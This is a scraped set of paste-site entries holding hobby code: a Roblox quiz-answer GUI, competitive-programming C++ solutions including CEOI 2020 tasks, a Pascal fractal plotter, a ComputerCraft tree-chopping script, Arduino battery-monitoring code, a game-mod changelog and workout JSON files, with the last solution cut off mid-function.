credits.Size = UDim2.new(0.8,0,0.2,0)
credits.BackgroundColor3 = Color3.fromRGB(20,20,20)
credits.Text = ""Made By 2AreYouMental110""
credits.TextScaled = true
credits.BorderColor3 = Color3.fromRGB(255,255,255)
credits.TextColor3 = Color3.fromRGB(255,255,255)
credits.Parent = mainframe

function delete()
    gui:Destroy()
    for i,v in pairs(connectstuff) do
        v:Disconnect()
    end
end

deletebutton.Position = UDim2.new(0.8,0,0,0)
deletebutton.Size = UDim2.new(0.2,0,0.2,0)
deletebutton.BackgroundColor3 = Color3.fromRGB(255,0,0)
deletebutton.Text = ""X""
deletebutton.TextScaled = true
deletebutton.BorderColor3 = Color3.fromRGB(255,255,255)
deletebutton.TextColor3 = Color3.fromRGB(255,255,255)
deletebutton.Parent = mainframe
table.insert(connectstuff,deletebutton.MouseButton1Click:Connect(function()
    delete()
end))

questiontext.Position = UDim2.new(0.525,0,0.3,0)
questiontext.Size = UDim2.new(0.425,0,0.6,0)
questiontext.BackgroundColor3 = Color3.fromRGB(60,60,60)
questiontext.Text = """"
questiontext.TextScaled = true
questiontext.BorderColor3 = Color3.fromRGB(255,255,255)
questiontext.TextColor3 = Color3.fromRGB(255,255,255)
questiontext.PlaceholderText = ""Questions Go Here""
questiontext.Parent = mainframe

answertext.Position = UDim2.new(0.05,0,0.3,0)
answertext.Size = UDim2.new(0.425,0,0.6,0)
answertext.BackgroundColor3 = Color3.fromRGB(60,60,60)
answertext.Text = """"
answertext.TextScaled = true
answertext.BorderColor3 = Color3.fromRGB(255,255,255)
answertext.TextColor3 = Color3.fromRGB(255,255,255)
answertext.ClearTextOnFocus = false
answertext.PlaceholderText = ""Answers Go Here""
answertext.Parent = mainframe

table.insert(connectstuff,questiontext.FocusLost:Connect(function()
    local arg = questiontext.Text
    for i,v in pairs(decodedsources) do
        print(i,v,arg)
        if i:lower() == arg:lower() then
            print(i,v,arg)
            answertext.Text = v
            return
        elseif string.find(i:lower(),arg:lower()) then
            print(i,v,arg)
            answertext.Text = v
        end
    end
end))"
uzParHvy,Untitled,Zeinab_Hamdy,C++,Friday 7th of July 2023 05:12:46 PM CDT,"#include<bits/stdc++.h>
using namespace std; 
#define nl ""\n""
#define fi first
#define se second
#define pb push_back
#define ll long long
#define ull unsigned ll
#define RV  return void
#define inf 2000000000
#define MOD ((ll) 1e9 + 7)
#define sz(x) int(x.size())
#define all(v) v.begin(), v.end()
#define rall(v) v.rbegin(), v.rend()
#define Mini(x) *min_element(all(x))
#define Maxi(x) *max_element(all(x))
#define fixed(n) fixed << setprecision(n)
#define ceil(w, m) (((w) / (m)) + ((w) % (m) ? 1 : 0))
#define cin(v) for (auto&i:v) cin >> i;
#define cout(v) for (auto&i:v) cout << i << "" "";
#define clr(memo, x) memset(memo, x, sizeof memo)
#define updmin(a, b) a = min(a, b)
#define updmax(a, b) a = max(a, b)
#define vi vector < int >
#define vl vector < ll >
#define vc vector < char >
#define vs vector < string >
#define v2i vector < vector < int > > 
#define v2l vector < vector < int > > 
#define seti set < int > 
#define setl set < ll > 
#define mapii map < int , int > 
#define mapll map < ll , ll > 
#define mapli map < ll , int > 
#define mapci map < char , int >
#define mapsi map < string , int > 
#define pll pair < ll , ll >
#define pii pair < int , int >
#define range(l,r,x) for(int i=l ; i < r ; i+=x)
#define FastCode ios_base::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr);
vector < string > ternary= {""NO\n"" , ""YES\n""};
 
void  Zainab(){
            #ifndef ONLINE_JUDGE
              freopen(""input.txt"", ""r"", stdin);  
              freopen(""output.txt"", ""w"", stdout);
            #endif
}
 
 
/*================================  Prblem solution  ================================ */

int dx[] ={ -1 , -1 , -1 , 1 , 1 , 1 , 0 , 0 };
int dy[] ={0 , 1 , -1   , 0 , -1 , 1 , -1 , 1};



void myCode(){

int n , q;
cin >> n >> q;

map < int , vector < pair < int , int > > > mp;
vector < vector < bool > > vis(n+1 , vector < bool > (n+1 , 0));
while(q--){
    int l ,r , x;
    cin >> l >> r >> x;
    if(x){
        vis[l][r]=1;
        mp[x].pb({l,r});
    }
    else vis[l][r]=0;
   
   int cnt =0;
   for(auto& [f,s] : mp){
       for(auto& w : s) {
           if(vis[w.fi][w.se]){
                cnt++;
                break;
           }
       }
   }
   if(cnt > 2 ) {
       cout << ""NO\n"";
       continue;
   }
   
    bool enter=0;
    for(auto& [f,s] : mp){
        if(!sz(s)) continue;
        
        int l2 = s[0].fi , r2=s[0].se ;
        for(auto& w : s){
            if( vis[w.fi][w.se] and (abs(w.fi-l2) + abs(w.se - r2))%2){
                enter = 1;
                cout << ""NO\n"";
                break;
            }
        } if(enter) break;
    }
    if(enter) continue;
    
    cout << ""YES\n"";
}



}
 

 
int main(){
                                   FastCode ;
                                    Zainab() ;
 
    int testCase=1;
       //  cin >> testCase ;
      for(int i=1 ; i<= testCase ; i++)
        myCode();
        
    return 0;
}"
caRY0zdJ,Universo,Wilhem_Everitt_Cauer,Pascal,Friday 7th of July 2023 05:09:14 PM CDT,"{$N+}
{$G+}
{$F+}
program DNyquist;
uses dos, crt, mate, graficos, pcx256;

const
  Cescalax = 300;
  Cescalay = 300;
  Ccentrox = 400;
  Ccentroy = 300;
  CDimx = 800;
  CDimy = 600;

procedure Ejes3d (Origen : Coord2D; ang : coord3dr; ancho : word);
  var
  c3, c3r : Coord3dr;
  j : word;
begin

for j := 0 to ancho do
  begin
  c3.x := j;
  c3.y := 0;
  c3.z := 0;
  rotacion3d(@c3, @c3r,ang.x, ang.y, ang.z);
  dibuja3diso (ponerpixel,Origen,c3r,15);
  c3.x := 0;
  c3.y := j;
  c3.z := 0;
  rotacion3d(@c3, @c3r,ang.x, ang.y, ang.z);
  dibuja3diso (ponerpixel,Origen,c3r,15);
  c3.x := 0;
  c3.y := 0;
  c3.z := j;
  rotacion3d(@c3, @c3r,ang.x, ang.y, ang.z);
  dibuja3diso (Ponerpixel,Origen,c3r,15);
end;
end;

function plano(x,y,z : precision):precision;
  begin
  plano := 0;
end;

procedure linea(x0,y0,x1,y1, color:word);
  var
    m, n : precision;
    x,y : precision;
    i,j : word;
  begin
  if x0 > x1 then
   begin
   x0 := x0 xor x1;
   x1 := x0 xor x1;
   x0 := x0 xor x1;
  end;
  if y0 > y1 then
   begin
   y0 := y0 xor y1;
   y1 := y0 xor y1;
   y0 := y0 xor y1;
  end;

  {y := mx+n}


  if x1 <> x0 then
    begin
    m := (y1-y0)/(x1-x0);
    x := x0;
    n := y0;

    while x <= x1 do
      begin
      y := ((x-x0)*m+n);
      ponerpixel(round(x),round(y),color);
      x :=  x+1/m;
    end;
  end;

  if x1 = x0 then
    for i := y0 to y1 do
      begin

      ponerpixel(x0,i,color);
    end;
  if y1 = y0 then
    for i := x0 to x1 do
      begin
      ponerpixel(i,y0,color);
    end;
end;



procedure Fractal(c : complejo; iter : word; ppixel: procpixel; color: word);
  const
  Scero = 1e-5;
  Rcero = 1e-2;
  iw = 1e-2;
  wo = 0;
  wf = 1E4;
  var
    z: complejo;
    x, y, x0, y0 : word;
    i : word;
  begin
     i := 1;
     z := c;

     x0 := round(Ccentrox+z.a*Cescalax);
     y0 := round(Ccentroy+z.bi*Cescalay);

     while (i < iter)  do
       begin
       cmult(z,z,z);
       cmult(z,c,z);
       csin(z,z);
       cadd(z,c,z);
       x := round(Ccentrox+z.a*Cescalax);
       y := round(Ccentroy+z.bi*Cescalay);

       if (y <= CDimy) and ((x <= CDimx) and (round(Ccentrox+z.a*Cescalax) > 0))
         then begin
         ponerpixel(x,y,color);
       end;
       x0 := x;
       y0 := y;
       i := i+1;
     end;

end;

procedure ejes(x,y, cuantox, cuantoy: word);
  const
    CAncho  = 5;
    Canchop = 2;
  var i, j : integer;
begin

  for i:= x to cuantox do
    begin
    ponerpixel(x+i,y, 15);

    if ((abs(i) mod Cescalax) = 0) then

      for j := -Cancho to CAncho do
        begin
        if ((x+i) <= 800) and ((y+j)<= 600) and ((x+i) > 0) and ((y+j) > 0) then
        ponerpixel(x+i,y+j, 15);
      end
    else
      if ((abs(i) mod (Cescalax div 5)) = 0) then
            for j := -Canchop  to CAnchop do
        begin
        if ((x+i) <= 800) and ((y+j)<= 600) and ((x+i) > 0) and ((y+j) > 0)then
        ponerpixel(x+i,y+j, 15);
      end;
  end;

  for i:= y to cuantoy do
    begin
    ponerpixel(x,y+i, 15);

    if ((abs(i) mod Cescalay) = 0) then
      for j := Cancho to CAncho do
        begin
        if ((x+j) <= 800) and ((y+i)<= 600) and ((x+j) > 0) and ((y+i) > 0) then
        ponerpixel(x+j,y+i, 15);
      end
    else
      if ((abs(i) mod (Cescalay div 5)) = 0) then
            for j := -CAnchop  to CAnchop do
        begin
        if ((x+j) <= 800) and ((y+i)<= 600) and ((x+j) > 0) and ((y+i) > 0)then
        ponerpixel(x+j,y+i, 15);
      end;

  end;end;


var

  i,j,k,l, color : word;
  x : complejo;
  nfich : string[8];
  ngalax : precision;
begin
clrscr;
OffMatErr(OpNovalida);
OffMatErr(OpAnormal or DivCero);

Nfich := '';
clrscr;
writeln ('Meter nombre del fichero: ');
readln (Nfich);

modovideoext(v800x600x256);

for i := 0 to 7 do
  for j := 0 to 5 do
  begin
    for k := 1 to 3 do
     begin
     linea(i*100+25*k,j*100,i*100+25*k,(j+1)*100,20);
     linea(i*100,j*100+25*k,(i+1)*100,j*100+25*k,20);
    end;
  end;

for i := 0 to 7 do
  for j := 0 to 5 do
  begin
  linea(i*100,j*100,i*100,(j+1)*100,25);
  linea(i*100,j*100,(i+1)*100,j*100,25);
  end;
linea(1,599,800,599,23);
linea(799,1,799,600,23);





randomize;
while not keypressed do
  begin

  x.a := random(65535)/32767;
  x.bi := random(65535)/32767;
  color := random(254)+1;
  for k := 1 to 4 do
    begin
      case k of
       2: x.a := -x.a;
       3: x.bi := -x.bi;
       4: begin
          x.a := -x.a;
          x.bi := -x.bi;
          end;
       end;
  fractal(x,200,ponerpixel,color xor k);
  end;
end;





if Nfich <> '' then
  begin
  sound(3000);
  delay(500);
  nosound;
  writepcx256(Nfich+'.pcx',1,1,800,600);
  sound(3000);
  delay(500);
  nosound;
end;

readkey;
modovideo(3);
end."
qEhi0GZu,TreeChop,true_beef,Lua,Friday 7th of July 2023 05:02:01 PM CDT,"-- Uses Lightweight Json Library by rxi. Thanks dude.
-- https://github.com/rxi/json.lua
-- json.encode({ 1, 2, 3, { x = 10 } }) -- Returns '[1,2,3,{""x"":10}]'
-- json.decode('[1,2,3,{""x"":10}]') -- Returns { 1, 2, 3, { x = 10 } }
json = require(""json"")
turtleUtil = require(""TurtleMovementUtil"")

treeHeight = 0
pruneLeaves = false

local function TurnAndMine()
	turtleUtil.turnLeft()
	turtle.dig()
end

function ChopTree( desiredHeight )
	turtleUtil.initGlobals()
	turtleUtil.goToPos(vector.new(1, 0, 0))	
	for i=0, desiredHeight - 1 do
		TurnAndMine()
		TurnAndMine()
		TurnAndMine()
		TurnAndMine()
		turtleUtil.goToPos(vector.new(1, 0, i))		
	end
end


local function CheckReadNum(read)
	if(tonumber(read) == nil) then
		return false
	elseif(tonumber(read) < 100) then
		return true, read
	end
end

local function CheckReadYN(read)
	if(read == ""y"") then
		return true
	else
		return false
	end
end


local function BeginTreeChop()	
	print(""How high?"")
	local success, readData = CheckReadNum(read())
	if(success == false) then		
		print(""Sorry, too high. Less than 100 blocks."")		
	else
		treeHeight = readData
	end

	print(""Prune adjacent blocks?"")
	if(CheckReadYN(read())) then
		pruneLeaves = true
	end

	print(""Choping tree"")
	ChopTree(treeHeight)
end


BeginTreeChop()


"
aktTVqCt,Reading Battery Voltages with Averaging,JonD1988,Arduino,Friday 7th of July 2023 04:27:53 PM CDT,"#include <Wire.h> //Needed to Use ADS1115 ADC - See Reference 12
#include <ADS1115_lite.h> //Needed to Use ADS1115 ADC - See Reference 12
ADS1115_lite ads(ADS1115_DEFAULT_ADDRESS); //0x48 addr pin connected to GND. Needed to Use ADS1115 ADC - See Reference 12
long raw1 = 0, raw2 = 0; //Needed to Use ADS1115 ADC - See Reference 12
double resolution=0; //Needed to Use ADS1115 ADC - See Reference 12
int batt1Analog = 0, batt2Analog=0; //Analog readings from batt1Pin and batt2Pin and then actual battery voltages
float batt1V=0, batt2V=0; 
unsigned long previousMillis = 0;      // will store last time the battery voltages were read
const long interval = 10000;           // interval at which to read the battery voltage (milliseconds)
#define battCutOff 3.0 //Voltage to Cutoff Motors to Protect the Batteries
#define numReadsToAvg 3 //Number of Voltage Readings to Store and Take Average Of
float batt1VArray[numReadsToAvg]; //Array to store batt1V readings i.e. battery 1 voltages
float batt2VArray[numReadsToAvg]; //Array to store batt2V readings i.e. battery 2 voltages
int batt1VIndex = 0, batt2VIndex = 0; //Keeps track of the array indexes for the batt1VArray and batt2VArray
float batt1VAvg = 3.0, batt2VAvg = 3.0; //Initialize battery voltage reading averages to 3.0
float batt1VSum = 0.0, batt2VSum = 0.0; //Sums all the elements in the batt1VArray and the batt2VArray for use in the average calculations
int batt1VCount = 0, batt2VCount = 0; //Variable to keep track of the count of how many elements have been stored in the batt1VArray and batt2VArray - really only meant to be used initially before all elements of the arrays have been updated with non-zero values

void setup()
{ //start of void setup()
  ads_config(); //Needed to Use ADS1115 ADC - See Reference 12
} //end of void setup()

void loop()
{ //start of void loop()

unsigned long currentMillis = millis(); //Checks the current time

    if (currentMillis - previousMillis >= interval) //Check to see if it's time to read the battery voltages (if the difference between the current time and last time you read the battery voltages is bigger than the interval at which you want to read the battery voltages)
    { //Start of if (currentMillis - previousMillis >= interval)
        previousMillis = currentMillis; //save the last time you read the battery voltages before you read the battery voltages
        readBatts(); //Read the battery voltages
    } //End of if (currentMillis - previousMillis >= interval)

} //end of void loop()

void readBatts()
{ //Start of readBatts function definition
  raw1 = ads_read1(); //Reads A0 from ADS1115 - Reference 12
  resolution=4096.00/32752.00;
  delay(200);
  float result1=(raw1*resolution)/1000.00; //batt1 voltage + batt2 voltage
  raw2 = ads_read2(); //Reads A0 from ADS1115 - Reference 12
  delay(200);
  float result2=(raw2*resolution)/1000.00; //batt2 voltage alone
  batt1V = result1 - result2; //Assigns battery 1 voltage alone to batt1V variable
  batt1V = 11.03*batt1V;
  batt2V = result2; //Assigns result2 to the batt2V variable
  batt2V = 11.0*batt2V;
  
  batt1VArray[batt1VIndex] = batt1V; //Store the current batt1V value into the element of the batt1VArray that matches batt1VIndex
  batt2VArray[batt2VIndex] = batt2V; //Store the current batt2V value into the element of the batt2VArray that matches batt2VIndex
  batt1VIndex = (batt1VIndex + 1) % numReadsToAvg; //Increments batt1VIndex by 1 each time this line runs and the % numReadsToAvg means that the batt1VIndex will take on values from 0 up to but not including numReadsToAvg (i.e. 0, 1, 2, 0, 1, 2, etc. if numReadsToAvg = 3)
  batt2VIndex = (batt2VIndex + 1) % numReadsToAvg; //Increments batt2VIndex by 1 each time this line runs and the % numReadsToAvg means that the batt2VIndex will take on values from 0 up to but not including numReadsToAvg (i.e. 0, 1, 2, 0, 1, 2, etc. if numReadsToAvg = 3)
  
  //Perform the average calculation with non-zero elements of the batt1VArray and batt2VArray
  for(int i=0; i<numReadsToAvg; i++)
  { //Start of for loop to step through the elements in the batt1VArray
	  if(batt1VArray[i] != 0.0) //If the current value is non-zero
	  { //Start of if statement to check if the current element of the batt1VArray is non-zero
		  batt1VSum += batt1VArray[i]; //Add the current value to the running sum for the average calculation 
		  batt1VCount++; //Increment the counter to keep track of the current number of non-zero elements in the sum
	  } //End of if statement to check if the current element of the batt1VArray is non-zero
  } //end of for loop to step through the elements in the batt1VArray
  
  if (batt1VCount > 0 && batt1VCount < numReadsToAvg)
  {
	  batt1VAvg = batt1VSum / batt1VCount; //Calculates the average
  }
  //Without the following two lines of code batt1VSum and batt1VCount could increase without limit (as much as those variable types can hold) retaining impact from values beyond the current set of stored readings in the array and therefore wouldn't react to newer voltage readings after a while
  batt1VSum = 0.0; //After the sum is used in the calculation of the current batt1VAvg set it back to its initial value so that it isn't impacted by past readings. The sum is meant to be used for the current set of numReadsToAvg
  batt1VCount = 0; //After the count is used in the calculation of the current batt1VAvg set it back to its initial value so that it isn't impacted by past readings.  The count is meant to be used for the current set of numReadsToAvg

  for(int j=0; j<numReadsToAvg; j++)
  { //Start of for loop to step through the elements in the batt2VArray
	  if(batt2VArray[j] != 0.0) //If the current value is non-zero
	  { //Start of if statement to check if the current element of the batt2VArray is non-zero
		  batt2VSum += batt2VArray[j]; //Add the current value to the running sum for the average calculation 
		  batt2VCount++; //Increment the counter to keep track of the current number of non-zero elements in the sum
	  } //End of if statement to check if the current element of the batt2VArray is non-zero
  } //end of for loop to step through the elements in the batt2VArray
  
  if (batt2VCount > 0 && batt2VCount < numReadsToAvg)
  {
	  batt2VAvg = batt2VSum / batt2VCount; //Calculates the average
  }
  //Without the following two lines of code batt2VSum and batt2VCount could increase without limit (as much as those variable types can hold) retaining impact from values beyond the current set of stored readings in the array and therefore wouldn't react to newer voltage readings after a while
  batt2VSum = 0.0; //After the sum is used in the calculation of the current batt2VAvg set it back to its initial value so that it isn't impacted by past readings. The sum is meant to be used for the current set of numReadsToAvg
  batt2VCount = 0; //After the count is used in the calculation of the current batt2VAvg set it back to its initial value so that it isn't impacted by past readings.  The count is meant to be used for the current set of numReadsToAvg
  
  //This section of code sends the battery voltages to the Android app
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""W"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  //SerialBT.print(batt1V);
  SerialBT.print(batt1VAvg);  
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""w"");  //Delimeter separating values which the receiving app is programmed to recognize

  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""Z"");  //Delimeter separating values which the receiving app is programmed to recognize
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize
  //SerialBT.print(batt2V);
  SerialBT.print(batt2VAvg);
  SerialBT.print(""|"");  //Delimeter separating values which the receiving app is programmed to recognize      
  SerialBT.print(""z"");  //Delimeter separating values which the receiving app is programmed to recognize

  //if (batt1V < battCutOff || batt2V < battCutOff) //If either battery drops below the cutoff voltage
  if (batt1VAvg < battCutOff || batt2VAvg < battCutOff) //If either battery drops below the cutoff voltage
  { //Start of if (batt1V < battCutOff || batt2V < battCutOff)
    stopVehicle(); //Stop Power to the Motors
    lightFState = 0; //Turns Off Front Lights
    lightBState = 0; //Turns Off Back Lights
    hornH(); //Turns horn on briefly
    delay(100);
    hornL();
   } //End of if (batt1V < battCutOff || batt2V < battCutOff)
  
} //End of readBatts function definition

void ads_config(){
  ads.setGain(ADS1115_REG_CONFIG_PGA_4_096V); // GAIN_ONE and resolution to ± 4.096V
  ads.setSampleRate(ADS1115_REG_CONFIG_DR_8SPS); // Set to the fastest MODE 860Samples per sec
}

int16_t ads_read1(){ 
  ads.setMux(ADS1115_REG_CONFIG_MUX_SINGLE_0);  // Single mode input on AIN0 (AIN0 - GND)
  ads.triggerConversion();  // Triggered mannually 
  return ads.getConversion();  // returns int16_t value
}

int16_t ads_read2(){ 
  ads.setMux(ADS1115_REG_CONFIG_MUX_SINGLE_1);  // Single mode input on AIN1 (AIN1 - GND)
  ads.triggerConversion();  // Triggered mannually 
  return ads.getConversion();  // returns int16_t value
}
//Reference 12- Reading Analog Voltages Using ADS1115 https://www.youtube.com/watch?v=u-1TRpLGH04"
3pfAcseJ,BWR - Changelog 7/7/23,SSilver,Diff,Friday 7th of July 2023 04:25:23 PM CDT,"Medieval
+ Restored health packs replacing ammo packs dropped on death
Making the mode consistent with its normal incarnation.

Conniver's Kunai
+ Removed cloak drain penalty
This downside seemed unnecessary given the existing downside post-stab to regulate frequent stabs, by punishing the spy trying to escape rather than continue stabbing.

Back Scatter
+ Increased accuracy bonus to 30% (was 20%)
Given its wide pellet distribution the prior version seemed a bit too punishing at longer range, so it was tightened slightly.

Revolvers
+ Fixed headshots dealing worse damage than bodyshots at far range
A quirk that came about in nullifying crits to give revolvers gradual spread recovery.

Huo-Long Heater
+ Increased explosion radius to 146 HU (was 120 HU)
Sharpened Volcano Fragment
+ Increased explosion radius to 146 HU (was 102 HU)
Iron Bomber
+ Increased proximity bomb blast radius to 102 HU (was 78 HU)
A slight buff to the SVF while also just generally correcting how distance was being calculated between players and radius effects."
HetN2y6s,Ficha2_Karen,AuraUtils,JSON,Friday 7th of July 2023 04:13:19 PM CDT,"{
  ""Ficha"": ""Treino 2"",
  ""FichaTreino"": [

    {
      ""Titulo"": ""Supino Inclinado"",
      ""Linha1"": ""4 Series"",
      ""Linha2"": ""10 Reps""
    },
    {
      ""Titulo"": ""Flexão"",
      ""Linha1"": "" 4 Series"",
      ""Linha2"": ""Falha""
    },
    {
      ""Titulo"": ""Ele. Lateral Cross"",
      ""Linha1"": ""4 Series"",
      ""Linha2"": ""10 Reps""
    },
    {
      ""Titulo"": ""Triceps Pulley"",
      ""Linha1"": "" 4 Series"",
      ""Linha2"": ""8 Reps""
    },
    {
      ""Titulo"": ""Triceps Banco"",
      ""Linha1"": "" 4 Series"",
      ""Linha2"": ""Falha""
    },
    {
      ""Titulo"": ""Burpee + Corda"",
      ""Linha1"": ""50 Burpee"",
      ""Linha2"": ""50 Corda""
    }
  ]
}"
dzrbfQjH,Ficha4_Lucas,AuraUtils,JSON,Friday 7th of July 2023 04:12:58 PM CDT,"{
  ""Ficha"": ""Treino 4"",
  ""FichaTreino"": [

    {
      ""Titulo"": ""Remada Alta Barra"",
      ""Linha1"": ""4 Serie"",
      ""Linha2"": ""10 Reps""
    },
    {
      ""Titulo"": ""Desenvolvimento Halter"",
      ""Linha1"": ""4 Serie"",
      ""Linha2"": ""10 Reps""
    },
    {
      ""Titulo"": ""Elevação Frontal Anilha"",
      ""Linha1"": ""4 Series"",
      ""Linha2"": ""8 Reps""
    },
    {
      ""Titulo"": ""Elevação Lateral Cross"",
      ""Linha1"": ""4 Series"",
      ""Linha2"": ""12 Reps""
    },
    {
      ""Titulo"": ""Encolhimento"",
      ""Linha1"": ""5 Series"",
      ""Linha2"": ""8 Reps""
    },
    {
      ""Titulo"": ""Corrida"",
      ""Linha1"": ""40 Min"",
      ""Linha2"": ""2 Alto 1 Baixo""
    }
  ]
}"
mQUxjvPU,CEOI '20 - Chess Rush (36pts),erek1e,C++,Friday 7th of July 2023 04:11:59 PM CDT,"#include <bits/stdc++.h>

using namespace std;

const int INF = 1e8;
const int BASE = 1e9 + 7;
int add(int x, int y) {
    x += y;
    if (x >= BASE) return x-BASE;
    return x;
}

int R, C;
bool sameDiagonal(int x1, int y1, int x2, int y2) {
    return x1-y1 == x2-y2 || x1+y1 == x2+y2;
}
bool sameColor(int x1, int y1, int x2, int y2) {
    return ((x1+y1)-(x2+y2)) % 2 == 0;
}
bool inBoard(int r, int c) {
    return r >= 1 && c >= 1 && r <= R && c <= C;
}
pair<int, int> diagonalIntersect(int x1, int y1, int x2, int y2) {
    // x + y = x1 + y1
    // x - y = x2 - y2
    // x = (x1 + y1 + x2 - y2) / 2
    // y = (x1 + y1 - x2 + y2) / 2
    return {(x1+y1+x2-y2)/2, (x1+y1-x2+y2)/2};
}

pair<int, int> downRight(int r, int c) {
    return {r+C-c, C};
}
pair<int, int> downLeft(int r, int c) {
    return {r+c-1, 1};
}

pair<int, int> combine(pair<int, int> a, pair<int, int> b) { // (moves, ways)
    if (a.first == b.first) return {a.first, add(a.second, b.second)};
    else if (a.first < b.first) return a;
    else return b;
}

// going right
pair<int, int> solveBishop(int c1, int cr) {
    vector<int> ways(2*C), moves(2*C, INF);
    ways[c1-1] = 1, moves[c1-1] = 1;
    for (int r = 2; r <= R; ++r) {
        vector<int> ways2(2*C), moves2(2*C, INF);

        auto can = [&](int pos, int dir, int w, int m) {
            if (0 <= pos && pos < C) {
                if (m < moves2[dir*C+pos]) moves2[dir*C+pos] = m, ways2[dir*C+pos] = w;
                else if (m == moves2[dir*C+pos]) ways2[dir*C+pos] = add(ways2[dir*C+pos], w);
            }
        };
        for (int i = 0; i < 2*C; ++i) {
            int c = i%C, dir = i/C;
            if (dir == 0) { // going right
                can(c+1, 0, ways[i], moves[i]);
                can(c-1, 1, ways[i], moves[i]+1);
            } else { // going left
                can(c+1, 0, ways[i], moves[i]+1);
                can(c-1, 1, ways[i], moves[i]);
            }
        }
        ways = ways2, moves = moves2;
    }
    return combine({moves[cr-1], ways[cr-1]}, {moves[cr-1+C], ways[cr-1+C]});
}

pair<int, int> solveKing(int c1, int cr) {
    vector<int> ways(C), moves(C, INF);
    ways[c1-1] = 1, moves[c1-1] = 0;
    for (int r = 2; r <= R; ++r) {
        vector<int> ways2(C), moves2(C, INF);

        auto can = [&](int pos, int w, int m) {
            if (0 <= pos && pos < C) {
                if (m < moves2[pos]) moves2[pos] = m, ways2[pos] = w;
                else if (m == moves2[pos]) ways2[pos] = add(ways2[pos], w);
            }
        };
        for (int c = 0; c < C; ++c) {
            can(c+1, ways[c], moves[c]+1);
            can(c-1, ways[c], moves[c]+1);
            can(c  , ways[c], moves[c]+1);
        }
        ways = ways2, moves = moves2;
    }
    return {moves[cr-1], ways[cr-1]};
}

int main() {
    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);
    int Q; cin >> R >> C >> Q;
    while (Q--) {
        char t; int c1, cr;
        cin >> t >> c1 >> cr;
        if (t == 'P') {
            if (c1 == cr) cout << R-1 << "" 1\n"";
            else cout << ""0 0\n"";
        } else if (t == 'R') {
            if (c1 == cr) cout << ""1 1\n"";
            else cout << ""2 2\n"";
        } else if (t == 'Q') {
            if (c1 == cr || sameDiagonal(1, c1, R, cr)) cout << ""1 1\n"";
            else { // 2 moves
                int ways = 2 + 2; // Rook Rook, vertical Rook and Bishop (or vice versa)
                if (R == C && (c1 == 1 || c1 == C)) ++ways; // bishop + horizontal rook move
                if (R == C && (cr == 1 || cr == C)) ++ways; // horizontal rook move + bishop
                // both bishop moves:
                if (sameColor(1, c1, R, cr)) {
                    auto [x1, y1] = diagonalIntersect(1, c1, R, cr);
                    if (inBoard(x1, y1)) ++ways;
                    auto [x2, y2] = diagonalIntersect(R, cr, 1, c1);
                    if (inBoard(x2, y2)) ++ways;
                }
                cout << ""2 "" << ways << '\n';
            }
        } else if (t == 'B') {
            pair<int, int> a = solveBishop(c1, cr), b = solveBishop(C+1-c1, C+1-cr);
            auto [m, w] = combine(a, b);
            if (m == INF) cout << ""0 0\n"";
            else cout << m << ' ' << w << '\n';
        } else { // t == 'K'
            auto [m, w] = solveKing(c1, cr);
            if (m == INF) cout << ""0 0\n"";
            else cout << m << ' ' << w << '\n';
        }
    }
    return 0;
}"
WirkB0VQ,CEOI '20 - Spring cleaning,erek1e,C++,Friday 7th of July 2023 04:10:51 PM CDT,"#include <bits/stdc++.h>

using namespace std;

vector<vector<int>> g;

// Segment tree
class Node {
private:
    int even = 0, odd = 0;
    bool prop = false;
    Node * left, * right;
    void propagate(int l, int r) {
        int mid = (l + r) / 2;
        if (!left) left = new Node(), left->even = mid-l;
        if (!right) right = new Node(), right->even = r-mid;
        if (prop) {
            left->prop = !left->prop;
            swap(left->even, left->odd);
            right->prop = !right->prop;
            swap(right->even, right->odd);
            prop = false;
        }
    }
public:
    void rangeToggle(int l, int r, int ql, int qr) { // flips even and odd nodes in a range
        if (qr <= l || r <= ql) return;
        else if (ql <= l && r <= qr) {
            prop = !prop;
            swap(even, odd);
        } else {
            propagate(l, r);
            int mid = (l + r) / 2;
            left->rangeToggle(l, mid, ql, qr);
            right->rangeToggle(mid, r, ql, qr);
            even = left->even + right->even;
            odd = left->odd + right->odd;
        }
    }
    int rangeEven(int l, int r, int ql, int qr) { // counts number of even in a range
        if (qr <= l || r <= ql) return 0;
        else if (ql <= l && r <= qr) return even;
        else {
            propagate(l, r);
            int mid = (l + r) / 2;
            return left->rangeEven(l, mid, ql, qr) + right->rangeEven(mid, r, ql, qr);
        }
    }
};

// HLD
vector<int> hldIndex, head, subtree, par;
void getSubtree(int node, int parent = 0) {
    par[node] = parent;
    subtree[node] = 1;
    for (int child : g[node]) {
        if (child == parent) continue;
        getSubtree(child, node);
        subtree[node] += subtree[child];
    }
}
int nextAvailableIndex = 0;
void build(int node, int hd, int parent = 0) {
    hldIndex[node] = nextAvailableIndex++;
    head[node] = hd;

    if (g[node].size() == 1 && parent) return;
    int mx = 0;
    if (g[node][0] == parent) mx = 1;
    for (int i = mx+1; i < (int)g[node].size(); ++i) {
        if (g[node][i] == parent) continue;
        if (subtree[g[node][i]] > subtree[g[node][mx]]) mx = i;
    }
    // move mx to front
    while (mx) {
        swap(g[node][mx], g[node][mx-1]);
        --mx;
    }
    // continue dfs as usual
    build(g[node].front(), hd, node);
    for (size_t i = 1; i < g[node].size(); ++i) {
        if (g[node][i] != parent) build(g[node][i], g[node][i], node);
    }
}

int main() {
    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);
    int n, q; cin >> n >> q;
    g.resize(1+n);
    for (int i = 1; i < n; ++i) {
        int u, v; cin >> u >> v;
        g[u].push_back(v);
        g[v].push_back(u);
    }

    int root = 1; // choose non-leaf root
    while (g[root].size() == 1) ++root;

    // build HLD
    subtree.resize(1+n), par.resize(1+n);
    getSubtree(root);
    hldIndex.resize(1+n), head.resize(1+n);
    build(root, root);
    

    Node * segRoot = new Node(); // segment tree for HLD
    auto toggleToRoot = [&](int a) { // toggle path from a to root
        while (a) {
            int first = hldIndex[head[a]], last = hldIndex[a]; // inclusive
            segRoot->rangeToggle(0, n, first, last+1); // toggle segtree range [first, last]
            a = par[head[a]];
        }
    };
    int originalLeaves = 0;
    for (int i = 1; i <= n; ++i) {
